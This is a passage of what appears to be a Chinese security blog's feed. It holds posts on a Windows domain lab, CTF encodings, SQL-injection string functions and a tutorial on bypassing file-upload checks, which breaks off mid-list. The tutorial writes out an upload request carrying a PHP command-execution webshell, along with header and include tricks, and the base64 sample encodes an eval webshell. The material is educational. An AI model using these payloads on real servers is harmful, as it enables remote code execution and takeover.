<td align="center"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_REQUEST[&#39;btn_submit&#39;]))&#123;</span><br><span class="line">echo &quot;正常取得的表单POST变量值：&quot;.$_REQUEST[&#39;Username&#39;].&quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">import_request_variables(&quot;pg&quot;, &quot;import_&quot;);</span><br><span class="line">&#x2F;&#x2F;显示导入的变量名称</span><br><span class="line">echo &quot;使用import_request_variables函数导入的变量值：&quot;.$import_Username;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></td>
<td align="center"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>域环境搭建</title>
    <url>/posts/55656.html</url>
    <content><![CDATA[<h2 id="0x00-环境搭建准备"><a href="#0x00-环境搭建准备" class="headerlink" title="0x00 环境搭建准备"></a>0x00 环境搭建准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DC: win server 2008 R2  IP: 192.168.72.10</span><br><span class="line">DM: win xp              IP: 192.168.72.11  </span><br><span class="line">DM: win server 2012     IP: 192.168.72.14</span><br></pre></td></tr></table></figure>

<h2 id="0x01-域控"><a href="#0x01-域控" class="headerlink" title="0x01 域控"></a>0x01 域控</h2><ol>
<li><p>修改计算机名(非必须)<br><img src="/posts/55656/1.png" alt></p>
</li>
<li><p>配置静态IP<br><img src="/posts/55656/2.png" alt></p>
</li>
<li><p>服务器管理器—&gt;角色：<br><img src="/posts/55656/3.png" alt></p>
</li>
<li><p>在新林中新建域<br><img src="/posts/55656/4.png" alt></p>
</li>
<li><p>命名林根域名<br><img src="/posts/55656/5.png" alt></p>
</li>
<li><p>设置林功能级别，下拉选择“Windows server 2008 R2”<br><img src="/posts/55656/6.png" alt></p>
</li>
<li><p>安装DNS<br><img src="/posts/55656/7.png" alt></p>
</li>
<li><p>数据库、日志文件、SYSVOL的位置(默认即可)<br><img src="/posts/55656/8.png" alt></p>
</li>
<li><p>设置密码<br><img src="/posts/55656/9.png" alt></p>
</li>
</ol>
<h2 id="0x02-域成员"><a href="#0x02-域成员" class="headerlink" title="0x02 域成员"></a>0x02 域成员</h2><h3 id="win-xp"><a href="#win-xp" class="headerlink" title="win xp"></a>win xp</h3><ol>
<li><p>配置静态IP，DNS填域控的IP地址(必须)，不然无法添加入域<br><img src="/posts/55656/xp.png" alt></p>
</li>
<li><p>添加入域</p>
</li>
</ol>
<p><img src="/posts/55656/ruyu.png" alt></p>
<ol start="3">
<li>注销，登录，选择切换用户，用户名<code>domain\administrator</code></li>
</ol>
<h3 id="win-server-2012与上面xp一样"><a href="#win-server-2012与上面xp一样" class="headerlink" title="win server 2012与上面xp一样"></a>win server 2012与上面xp一样</h3><h2 id="0x03-常用命令"><a href="#0x03-常用命令" class="headerlink" title="0x03 常用命令"></a>0x03 常用命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view                查看同一域&#x2F;工作组的计算机列表</span><br><span class="line">net view &#x2F;domain        查看域&#x2F;工作组列表</span><br><span class="line">net view &#x2F;domain:hello     查看hello域中 计算机列表</span><br><span class="line">net group &#x2F;domain       查看所在域的组</span><br><span class="line">net user &#x2F;domain        查看所在域用户</span><br><span class="line">net user &#x2F;domain zerosoul 12345678      修改域用户密码，需要域管理员权限，或者Ctrl+Alt+Del点击修改则不需要域管理员权限</span><br><span class="line">net localgroup administrators SECWINGzerosoul &#x2F;add         域Users组用户添加到本地Administrators组，需要本地管理员或域管理员在本机登陆域后进行</span><br></pre></td></tr></table></figure>

<p>下面的命令 只能用于 域控制器:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain controllers&quot;      查看域控制器(如果有多台)</span><br><span class="line">net group                       查看域的组</span><br><span class="line">net group &quot;domain admins&quot;       查看域管理员</span><br><span class="line">net group &quot;domain users&quot;        查看域成员</span><br></pre></td></tr></table></figure>

<p>上面的命令有点一开始不能用，会报系统错误。</p>
<ol>
<li>关闭防火墙</li>
<li>win+R 输入<code>services.msc</code>，找到<code>Computer Browser</code>，将其设置为自动，并启动。</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title>常见加解密总结</title>
    <url>/posts/56330.html</url>
    <content><![CDATA[<h2 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00  base64"></a>0x00  base64</h2><p>Base64就是用64个可显示字符表示所有的ASCii字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现<strong>1或2个’=’</strong></p>
<p>形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY&#x3D;</span><br></pre></td></tr></table></figure>
<p><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">base64在线加解密</a></p>
<h2 id="0x01-base32"><a href="#0x01-base32" class="headerlink" title="0x01 base32"></a>0x01 base32</h2><p>Base32是用32个字符表示256个ASCii字符，也就是说5个ASCii字符一组可以生成8个Base字符。</p>
<h2 id="0x02-培根密码"><a href="#0x02-培根密码" class="headerlink" title="0x02 培根密码"></a>0x02 培根密码</h2><p>培根密码实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。<br>它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏.需要注意的是输入的都应该是<strong>全小写字母或全大写字母</strong>。</p>
<p>第一种方式</p>
<p>A aaaaa B aaaab C aaaba D aaabb<br>E aabaa F aabab G aabba H aabbb<br>I abaaa J abaab K ababa L ababb<br>M abbaa N abbab O abbba P abbbb<br>Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb<br>Y bbaaa Z bbaab</p>
<p>第二种方式</p>
<p>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB</p>
<h2 id="0x03-摩斯密码"><a href="#0x03-摩斯密码" class="headerlink" title="0x03 摩斯密码"></a>0x03 摩斯密码</h2><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>
<p>形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– — .-. … .</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/Ar0vSSx.png" alt></p>
<p><a href="https://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯密码在线加解密</a></p>
<h2 id="0x04-JsFuck"><a href="#0x04-JsFuck" class="headerlink" title="0x04 JsFuck"></a>0x04 JsFuck</h2><p>JSFuck 可以只用6个字符 !+ 来编写 JavaScript 程序。</p>
<p>形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+ []]]]][([][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]()</span><br></pre></td></tr></table></figure>

<p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JsFuck在线加解密</a></p>
<h2 id="0x05-栅栏密码"><a href="#0x05-栅栏密码" class="headerlink" title="0x05 栅栏密码"></a>0x05 栅栏密码</h2><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明文：THERE IS A CIPHER</span><br><span class="line">去掉空格后变为：THEREISACIPHER</span><br><span class="line">两个一组，得到：TH ER EI SA CI PH ER</span><br><span class="line">先取出第一个字母：TEESCPE</span><br><span class="line">再取出第二个字母：HRIAIHR</span><br><span class="line">连在一起就是：TEESCPEHRIAIHR</span><br><span class="line">还原为所需密码。</span><br><span class="line">而解密的时候，我们先把密文从中间分开，变为两行：</span><br><span class="line">T E E S C P E</span><br><span class="line">H R I A I H R</span><br><span class="line">再按上下上下的顺序组合起来：</span><br><span class="line">THEREISACIPHER</span><br><span class="line">分出空格，就可以得到原文了：</span><br><span class="line">THERE IS A CIPHER</span><br><span class="line"> </span><br><span class="line">例如密文：NlEyQd&#123;seft&#125;</span><br><span class="line">N E Q &#123; e t</span><br><span class="line">l y d s f &#125;</span><br><span class="line"></span><br><span class="line">NEQ&#123;etIydsf&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>常用工具列表</title>
    <url>/posts/51461.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="3c0429e574063d01da93f1a4061ded3d0dca8f2f96013c2fde35aadd6b08d303">91a94175a3ddae5441ba2bd65b108e9dd18758429498f7a05073765c063040b645abbf357bcc87b24a6860e2e7ce9def95a3cee4c1a9533a279f8ca8ce700d1d81367c3c63bdd9bcd6dbd3ba3db31316afaa8dbba23c64c46e8c6e03462e2ca7d27e603e9a27db12c4bee187e81f8b454ca4ec5a46a2a57052aa7cc4989935964f27740bad7feaeecd275f02747c70d793702e30e69d1eb9ea7f363e58fe62dcd54670beb5752b5ed302e5b61043a855630b94da314153bc68bb769d5102ba93557a243d64ef666278807283cb02d7dcb8b6969e885bf92252075b5206b3f14392d952b9c810f9193bf1b446d7a1bc0cd07185af526657b08a935d8076a1e820b733c6138f43a6ae3caa98df47fb5eb34348ab72d102cf8e76fd47d123cac664b42f361a89bfadab1f382ab6f78478dc3e41a35b5b9029403e81fe61d12c6b46e08f4e62417fdc42e34eda337b838c582a203aa1b62dc998e418b28bdff874c27f21d8abc7ca819088eecee7a717dc36eaeb57c5ee9eab80712210ba5d7d151b8168ad7b55d20ec3cb5f9f4dadf3cc5d7b2fd7ec52a299b28661e2339ce2297d77ba6e14e41ac48679abf961e85b17c8</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>手工注入之常见字符串函数</title>
    <url>/posts/17087.html</url>
    <content><![CDATA[<p><img src="http://pp64r48ul.bkt.clouddn.com/sql1.png" alt></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两天整理了一下关于手工注入的方法，今天来说一说手工注入的几个字符串函数。在手工注入中常常需要一次查询多个结果，这里字符串函数就派上用场了。</p>
<p>手工注入字符串常用函数三个老朋友:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat()</span><br><span class="line">group_concat()</span><br><span class="line">concat_ws()</span><br></pre></td></tr></table></figure>

<h1 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONCAT(str1,str2)</span><br></pre></td></tr></table></figure>
<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。</p>
<h2 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h2><ul>
<li><p>参数中有NULL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  mysql&gt; SELECT CONCAT(id,&#39;,&#39;,NULL,&#39;,&#39;,password) AS users FROM users LIMIT 1,1;</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line">| NULL  |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用LIMIT来控制结果数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users;          </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| users                 |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| 1,Dumb,Dumb           |                                                        </span><br><span class="line">| 2,Angelina,I-kill-you |                                                        </span><br><span class="line">| 3,Dummy,p@ssword      |                                                        </span><br><span class="line">| 4,secure,crappy       |                                                        </span><br><span class="line">| 5,stupid,stupidity    |                                                        </span><br><span class="line">| 6,superman,genious    |                                                        </span><br><span class="line">| 7,batman,mob!le       |                                                        </span><br><span class="line">| 8,admin,admin         |                                                        </span><br><span class="line">| 9,admin1,admin1       |                                                        </span><br><span class="line">| 10,admin2,admin2      |                                                        </span><br><span class="line">| 11,admin3,admin3      |                                                        </span><br><span class="line">| 12,dhakkan,dumbo      |                                                        </span><br><span class="line">| 14,admin4,admin4      |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 1;  </span><br><span class="line">+-------------+                                                                  </span><br><span class="line">| users       |                                                                  </span><br><span class="line">+-------------+                                                                  </span><br><span class="line">| 1,Dumb,Dumb |                                                                  </span><br><span class="line">+-------------+                                                                  </span><br><span class="line">1 row in set (0.00 sec)                                                          </span><br><span class="line">mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 2;  </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| users                 |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| 1,Dumb,Dumb           |                                                        </span><br><span class="line">| 2,Angelina,I-kill-you |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">2 rows in set (0.00 sec)                                                         </span><br><span class="line">mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 0,1;</span><br><span class="line">+-------------+                                                                  </span><br><span class="line">| users       |                                                                  </span><br><span class="line">+-------------+                                                                  </span><br><span class="line">| 1,Dumb,Dumb |                                                                  </span><br><span class="line">+-------------+                                                                  </span><br><span class="line">1 row in set (0.00 sec)                                                          </span><br><span class="line">mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 0,2;</span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| users                 |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| 1,Dumb,Dumb           |                                                        </span><br><span class="line">| 2,Angelina,I-kill-you |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">2 rows in set (0.00 sec)                                                         </span><br><span class="line">mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 1,1;</span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| users                 |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">| 2,Angelina,I-kill-you |                                                        </span><br><span class="line">+-----------------------+                                                        </span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="CONCAT-WS"><a href="#CONCAT-WS" class="headerlink" title="CONCAT_WS"></a>CONCAT_WS</h1><p><code>CONCAT_WS()</code> 代表 <code>CONCAT With Separator</code> ，是<code>CONCAT()</code>的特殊形式。第一个参数是其它参数的分隔符。感觉比<code>CONCAT</code>更方便了呀，这样参数多的话就不用手动的去添加分隔符了。</p>
<h2 id="基本格式-1"><a href="#基本格式-1" class="headerlink" title="基本格式"></a>基本格式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONCAT_WS(separator,str1,str2,…)</span><br></pre></td></tr></table></figure>

<h2 id="使用案例-1"><a href="#使用案例-1" class="headerlink" title="使用案例"></a>使用案例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT_WS(&#39;~&#39;,id,username,password) AS users FROM users LIMIT 0,2;</span><br><span class="line">+-----------------------+                                                       </span><br><span class="line">| users                 |                                                       </span><br><span class="line">+-----------------------+                                                       </span><br><span class="line">| 1~Dumb~Dumb           |                                                       </span><br><span class="line">| 2~Angelina~I-kill-you |                                                       </span><br><span class="line">+-----------------------+                                                       </span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h1 id="GROUP-CONCAT"><a href="#GROUP-CONCAT" class="headerlink" title="GROUP_CONCAT"></a>GROUP_CONCAT</h1><p><code>GROUP_CONCAT</code>函数返回一个字符串结果，默认查询所有结果。该结果由分组中的值连接组合而成。</p>
<h2 id="基本格式-2"><a href="#基本格式-2" class="headerlink" title="基本格式"></a>基本格式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GROUP_CONCAT(str1,str2,…)</span><br></pre></td></tr></table></figure>

<h2 id="使用案例-2"><a href="#使用案例-2" class="headerlink" title="使用案例"></a>使用案例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT GROUP_CONCAT(id,username,password) AS users FROM users;                                                                                                                               </span><br><span class="line">+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| users                                                                                                                                                                                            |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| 1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4 |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h1 id="sql注入中一般使用方法"><a href="#sql注入中一般使用方法" class="headerlink" title="sql注入中一般使用方法"></a>sql注入中一般使用方法</h1><ul>
<li><p>列出所有的数据库</p>
<p><code>select group_concat(schema_name) from information_schema.schemata</code></p>
</li>
<li><p>列出某个库当中所有的表</p>
<p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;xxxxx&#39;</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>敏感词替换</title>
    <url>/posts/31986.html</url>
    <content><![CDATA[<h2 id="流程以及思路确定"><a href="#流程以及思路确定" class="headerlink" title="流程以及思路确定"></a>流程以及思路确定</h2><p>1.用户输入一串文字 ，保存到user_input中<br>2.检查文字是否有敏感词，以及敏感词的具体位置，直接使用relpace方式替换掉敏感词    <a id="more"></a><br>3.一句话中可能含有多个敏感字，这个时候就要重复2的步骤。<br>4.使用 * *len（str） 替换掉敏感词对应的个数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding:utf-8   </span><br><span class="line">user_input &#x3D; input(&#39;请输入:&#39;)   </span><br><span class="line">for filter_word in open(&#39;filter.txt&#39;):</span><br><span class="line">    filter &#x3D; filter_word.rstrip()</span><br><span class="line">    if filter in user_input:</span><br><span class="line">        filter_len &#x3D; len(filter)</span><br><span class="line">        user_input &#x3D; user_input.replace(filter,&#39;*&#39;*filter_len)</span><br><span class="line">else:</span><br><span class="line">    print(user_input)</span><br></pre></td></tr></table></figure>

<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
<li>python中文件的读取<br>函数open(filename,mode)用于读取文件，返回一个file object。 所以现在我们的filter.txt是一个文件对象<br>参数filename:是一个字符串，用来代表文件名.<br>参数mode:决定了打开文件的方式，比如只读(r)， 写入(w)， 追加等。</li>
<li>rstrip()方法<br>Python rstrip() 删除 string 字符串末尾的指定字符（默认为空格）.<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.rstrip([chars])</span><br></pre></td></tr></table></figure>
<ul>
<li>chars – 指定删除的字符（默认为空格）</li>
<li>返回删除 string 字符串末尾的指定字符后生成的新字符串</li>
</ul>
</li>
<li>replace()方法<br>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR.REPLACE(OLD, NEW[, MAX])</span><br></pre></td></tr></table></figure>
<ul>
<li>old – 将被替换的子字符串。</li>
<li>new – 新字符串，用于替换old子字符串。</li>
<li>max – 可选字符串, 替换不超过 max 次</li>
<li>返回字符串中的 old（旧字符串） 替换成 new(新字符串)后生成的新字符串，如果指定第三个参数max，则替换不超过 max 次。</li>
</ul>
</li>
<li>for …else…<br>只有当循环里没有遇到 break 时，else 块才会执行。<br>当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。<br>遇到这样的情况用 for … else ，除此之外，最好不要用它</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>文件上传姿势总结</title>
    <url>/posts/28047.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="474cb6a4bd93c9f56c74fccf546787ffd9194ffea2976cf1a83fb9607caf441b">607f0202230253bfae7c7369de0f7e695689ba1fcf854eff38844e46219119e2ded61109c9d2df07f9251eccc8f970f93157ecdae282db777fc844e20b37929756497fdb323f60917440b75c5324d6fc2ec3c6168dc996300c90586a7e45efb7c5fe6d219e6397a543d1f2a7b535addd41888d546cc96f2c6636962e9dde5c86e3b32d7b11fa4ada76bac527f12684ce42b1a7d71402c44234a4bea0be6de02212c39ae2a7753668fd08d477e61a3d62e08fde6cba1360455f0ae108576b05bf</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传(一)之绕过姿势</title>
    <url>/posts/62304.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势。</p>
<h2 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h2><h3 id="客户端JavaScript校验（一般只校验后缀名）"><a href="#客户端JavaScript校验（一般只校验后缀名）" class="headerlink" title="客户端JavaScript校验（一般只校验后缀名）"></a>客户端JavaScript校验（一般只校验后缀名）</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br><strong>判断方式：</strong>在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
<h3 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h3><h4 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h4><p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if($_FILES[&#39;userfile&#39;][&#39;type&#39;] !&#x3D; &quot;image&#x2F;gif&quot;)  #这里对上传的文件类型进行判断，如果不是image&#x2F;gif类型便返回错误。</span><br><span class="line">                &#123;   </span><br><span class="line">                 echo &quot;Sorry, we only allow uploading GIF images&quot;;</span><br><span class="line">                 exit;</span><br><span class="line">                 &#125;</span><br><span class="line">         $uploaddir &#x3D; &#39;uploads&#x2F;&#39;;</span><br><span class="line">         $uploadfile &#x3D; $uploaddir . basename($_FILES[&#39;userfile&#39;][&#39;name&#39;]);</span><br><span class="line">         if (move_uploaded_file($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;], $uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">                 echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">            &#125; </span><br><span class="line">            else &#123;</span><br><span class="line">                     echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
<h4 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h4><p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2） .gif，”GIF 89A”<br>（3） .zip，”Zip Compressed”<br>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>
<h2 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h2><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
<h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><h4 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h4><p>我们可以通过抓包，将content-type字段改为image/gif</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">TE: deflate,gzip;q&#x3D;0.3</span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl&#x2F;5.803</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;xYzZY</span><br><span class="line">Content-Length: 155</span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;userfile&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: image&#x2F;gif (原为 Content-Type: text&#x2F;plain)</span><br><span class="line">&lt;?php system($_GET[&#39;command&#39;]);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>

<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a<?php phpinfo(); ?></p>
<h4 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h4><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx<br>php php php3 php4<br>exe exee</p>
<h4 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h4><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?><br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
